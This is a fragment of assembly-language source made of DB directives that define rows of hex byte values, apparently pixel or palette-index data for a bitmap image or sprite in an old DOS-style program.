DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH
DB 01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01AH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01AH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01AH,01AH,01AH,01AH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01AH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,000H
DB 000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,000H,000H,000H,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,013H,013H,013H,013H,013H,013H,013H,013H,013H,013H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,00BH,00BH,00BH,00BH,00BH,00BH,00BH,00BH,013H,013H,01CH,01CH,01CH,01CH
DB 01CH,01CH,00BH,00BH,00BH,00BH,00BH,00BH,00BH,00BH,00BH,013H,013H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,003H,00BH,013H,016H,016H,016H,016H,016H,00BH
DB 00BH,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,00BH,00BH,00BH,00BH,00BH,00BH
DB 00BH,00BH,00BH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,00BH,00BH,014H,016H
DB 016H,016H,016H,016H,016H,00BH,003H,000H,01CH,01CH,01CH,01CH,01CH,01CH,013H
DB 013H,013H,013H,013H,013H,013H,00BH,00BH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,013H,017H
DB 017H,017H,017H,017H,017H,019H,013H,013H,01CH,01CH,01CH,01CH,01CH,01CH,00BH
DB 017H,017H,017H,017H,017H,017H,017H,019H,013H,013H,01CH,01CH,01CH,01CH,01CH
DB 01CH,00BH,013H,016H,017H,017H,017H,018H,018H,018H,018H,017H,017H,017H,00BH
DB 000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,016H,019H,017H,017H,017H,017H,017H,017H,017H,016H
DB 01CH,01CH,01CH,01CH,01CH,003H,00BH,016H,017H,017H,017H,018H,018H,018H,018H
DB 018H,017H,017H,017H,016H,00BH,01CH,01CH,01CH,01CH,01CH,00BH,017H,017H,017H
DB 017H,017H,017H,017H,019H,013H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,013H,01AH,018H,018H,018H
DB 018H,019H,01AH,013H,013H,01CH,01CH,01CH,01CH,01CH,01CH,00BH,018H,01AH,018H
DB 018H,018H,018H,019H,01AH,013H,013H,01CH,01CH,01CH,01CH,000H,00BH,016H,017H
DB 018H,018H,019H,019H,019H,019H,019H,019H,019H,018H,018H,017H,017H,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,016H,01AH,01AH,018H,018H,018H,018H,019H,019H,016H,01CH,01CH,01CH
DB 01CH,00BH,016H,017H,017H,018H,019H,019H,019H,019H,019H,019H,019H,019H,018H
DB 018H,018H,017H,00BH,01CH,01CH,01CH,01CH,00BH,017H,01AH,018H,018H,018H,018H
DB 01AH,019H,013H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,00BH,013H,01AH,01AH,019H,019H,019H,01AH,01AH
DB 013H,013H,01CH,01CH,01CH,01CH,01CH,01CH,00BH,018H,01AH,01AH,019H,019H,019H
DB 01AH,01AH,013H,013H,01CH,01CH,01CH,000H,013H,017H,018H,018H,019H,019H,019H
DB 01AH,01AH,01AH,01AH,01AH,019H,019H,019H,019H,018H,017H,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,016H
DB 01AH,01AH,01AH,019H,019H,01AH,01AH,018H,016H,01CH,01CH,01CH,00BH,016H,017H
DB 018H,019H,019H,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,019H,019H,019H,019H
DB 018H,00BH,01CH,01CH,01CH,00BH,017H,01AH,01AH,019H,019H,01AH,01AH,019H,013H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,00BH,013H,01AH,01AH,01AH,019H,01AH,01AH,01AH,013H,013H,01CH
DB 01CH,01CH,01CH,01CH,01CH,00BH,019H,01AH,01AH,01AH,019H,01AH,01AH,01AH,013H
DB 013H,01CH,01CH,01CH,00BH,017H,018H,019H,019H,019H,019H,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,019H,019H,019H,019H,017H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,016H,01AH,01AH,01AH
DB 019H,019H,01AH,01AH,018H,016H,01CH,01CH,003H,016H,017H,019H,019H,019H,019H
DB 01AH,01AH,01AH,01AH,01AH,019H,01AH,01AH,019H,019H,019H,019H,019H,018H,003H
DB 01CH,01CH,00BH,017H,01AH,01AH,01AH,019H,01AH,01AH,01AH,013H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 00BH,013H,01AH,01AH,01AH,019H,01AH,01AH,01AH,013H,013H,01CH,01CH,01CH,01CH
DB 01CH,01CH,00BH,019H,01AH,01AH,019H,019H,01AH,01AH,01AH,013H,013H,01CH,01CH
DB 003H,017H,018H,019H,019H,019H,019H,01AH,01AH,01AH,01AH,019H,019H,01AH,01AH
DB 01AH,01AH,019H,019H,019H,019H,00BH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,016H,01AH,01AH,01AH,019H,019H,01AH
DB 01AH,018H,016H,01CH,01CH,014H,017H,019H,019H,019H,019H,019H,01AH,01AH,017H
DB 00BH,00BH,017H,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,018H,01CH,01CH,00BH
DB 017H,01AH,01AH,01AH,019H,01AH,01AH,019H,013H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
